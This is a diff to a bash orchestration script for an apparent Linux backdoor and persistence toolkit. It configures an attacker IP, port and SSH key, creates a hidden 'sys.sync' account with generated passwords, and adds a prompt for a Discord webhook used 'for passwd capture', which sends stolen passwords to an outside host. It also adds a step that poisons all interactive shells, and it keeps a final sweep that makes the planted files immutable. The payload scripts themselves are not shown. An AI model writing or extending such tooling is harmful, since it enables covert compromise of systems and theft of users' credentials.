@@ -31,6 +31,9 @@ if [[ -z "${ATTACKER_PUBKEY:-}" ]]; then
   fi
 fi
 
+if [[ -z "${WEBHOOK_URL:-}" ]]; then
+  read -r -p "[?] Discord webhook URL (for passwd capture): " WEBHOOK_URL
+fi
 if [[ -z "${SHADOW_PASS:-}" ]]; then
   SHADOW_PASS="$(tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 16 || true)"
 fi
@@ -38,7 +41,7 @@ if [[ -z "${MAGIC_PASS:-}" ]]; then
   MAGIC_PASS="$(tr -dc 'a-f0-9' < /dev/urandom | head -c 24 || true)"
 fi
 
-export ATTACKER_IP ATTACKER_PORT ATTACKER_PUBKEY SHADOW_PASS MAGIC_PASS \
+export ATTACKER_IP ATTACKER_PORT ATTACKER_PUBKEY WEBHOOK_URL SHADOW_PASS MAGIC_PASS \
        SHADOW_USER="${SHADOW_USER:-sys.sync}"
 
 ACTION="${1:-deploy}"
@@ -93,6 +96,7 @@ if [[ "$MODE" == "all" || "$MODE" == "persistence" ]]; then
     *) ;;
   esac
 
+  run 14_shell_poison.sh      # Poison all interactive shells (annoying AF)
   run 06_immutable_sweep.sh   # Always last — locks everything planted above
 fi
 
